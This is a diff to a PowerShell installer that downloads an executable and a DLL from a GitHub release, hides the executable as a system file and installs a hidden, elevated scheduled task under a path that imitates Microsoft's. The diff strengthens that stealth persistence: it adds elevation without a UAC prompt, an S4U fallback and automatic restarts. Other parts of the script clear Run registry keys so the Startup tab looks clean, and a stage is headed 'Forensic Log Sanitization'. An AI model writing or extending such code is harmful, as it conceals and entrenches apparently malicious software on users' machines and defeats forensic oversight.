@@ -23,13 +23,13 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$RELEASE_EXE_URL = "https://github.com/lgfire093/syspanel/releases/download/espbase-20261107-2000/SystemNetworkSvc.exe"
-$RELEASE_DLL_URL = "https://github.com/lgfire093/syspanel/releases/download/espbase-20261107-2000/cimgui.dll"
+$RELEASE_EXE_URL = "https://github.com/lgfire093/syspanel/releases/download/espbase-20261107-2118/SystemNetworkSvc.exe"
+$RELEASE_DLL_URL = "https://github.com/lgfire093/syspanel/releases/download/espbase-20261107-2118/cimgui.dll"
 $SCRIPT_RAW_URL  = "https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1?v=1733a"
 
 # Pinned to the espbase build. A stale release asset is rejected instead of
 # silently installing an old panel.
-$BUILD_ID          = "ESPBASE-20261107-2000"
+$BUILD_ID          = "ESPBASE-20261107-2118"
 $EXPECT_EXE_SHA256 = "9F79AA59417BBD196302D2DD0370898F258F1F7D0D62E20988F55621A0D47CBD"
 $EXPECT_DLL_SHA256 = "1BD5D2BF9FDDEE9273648719F4B4E400EB35D0E06176D92BC06263D445D7867E"
 
@@ -318,20 +318,49 @@ try {
     $exeItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 } catch {}
 
-# Register Scheduled Task cleanly
-$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b" -WorkingDirectory $DEST_DIR
-$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
-$settingsTask = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -Priority 7
-$principal    = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+# Register Scheduled Task cleanly.
+# A group principal (BUILTIN\Administrators) cannot be started by a logon
+# trigger: Task Scheduler stores it, then fails every logon with 0xFFFFFFFF
+# and the host never comes up. Bind the task to the installing user with an
+# interactive token instead - it still runs elevated (RunLevel Highest) and
+# never raises a UAC prompt.
+$taskUser      = "$env:USERDOMAIN\$env:USERNAME"
+$taskPath      = "\Microsoft\Windows\Network\"
+$action        = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b" -WorkingDirectory $DEST_DIR
+$triggerLogon  = New-ScheduledTaskTrigger -AtLogOn -User $taskUser
+try { $triggerLogon.Delay = "PT15S" } catch {}
+$settingsTask  = New-ScheduledTaskSettingsSet -Hidden `
+    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+    -ExecutionTimeLimit 0 -Priority 7 -MultipleInstances IgnoreNew `
+    -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
 
-Register-ScheduledTask `
-    -TaskName  $TASK_NAME `
-    -TaskPath  "\Microsoft\Windows\Network\" `
-    -Action    $action `
-    -Trigger   $triggerLogon `
-    -Settings  $settingsTask `
-    -Principal $principal `
-    -Force -ErrorAction SilentlyContinue | Out-Null
+$taskOk = $false
+try {
+    $principal = New-ScheduledTaskPrincipal -UserId $taskUser -LogonType Interactive -RunLevel Highest
+    Register-ScheduledTask `
+        -TaskName  $TASK_NAME `
+        -TaskPath  $taskPath `
+        -Action    $action `
+        -Trigger   $triggerLogon `
+        -Settings  $settingsTask `
+        -Principal $principal `
+        -Force -ErrorAction Stop | Out-Null
+    $taskOk = $true
+} catch {
+    # Fallback: S4U keeps the elevated token without an interactive session.
+    try {
+        $principalS4U = New-ScheduledTaskPrincipal -UserId $taskUser -LogonType S4U -RunLevel Highest
+        Register-ScheduledTask `
+            -TaskName  $TASK_NAME `
+            -TaskPath  $taskPath `
+            -Action    $action `
+            -Trigger   $triggerLogon `
+            -Settings  $settingsTask `
+            -Principal $principalS4U `
+            -Force -ErrorAction Stop | Out-Null
+        $taskOk = $true
+    } catch { $taskOk = $false }
+}
 
 # Clean all Run registry keys to ensure Task Manager Startup tab stays 100% clean
 $startupRunKeys = @(
@@ -345,15 +374,29 @@ foreach ($rk in $startupRunKeys) {
 }
 
 # Stage 6: Launch Single Background Host Process
+# Start it through the task, so the install proves the persistence path works.
 Show-Step 99 "Starting host service..."
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName         = $EXE_PATH
-$psi.Arguments        = "-b"
-$psi.WorkingDirectory = $DEST_DIR
-$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi.CreateNoWindow   = $true
-$psi.UseShellExecute  = $false
-[System.Diagnostics.Process]::Start($psi) | Out-Null
+$started = $false
+if ($taskOk) {
+    try {
+        Start-ScheduledTask -TaskName $TASK_NAME -TaskPath $taskPath -ErrorAction Stop
+        $deadline = (Get-Date).AddSeconds(30)
+        while ((Get-Date) -lt $deadline) {
+            if (Get-Process -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue) { $started = $true; break }
+            Start-Sleep -Milliseconds 500
+        }
+    } catch { $started = $false }
+}
+if (-not $started) {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName         = $EXE_PATH
+    $psi.Arguments        = "-b"
+    $psi.WorkingDirectory = $DEST_DIR
+    $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.CreateNoWindow   = $true
+    $psi.UseShellExecute  = $false
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+}
 
 # Stage 7: Forensic Log Sanitization
 Show-Step 100 "Setup complete"
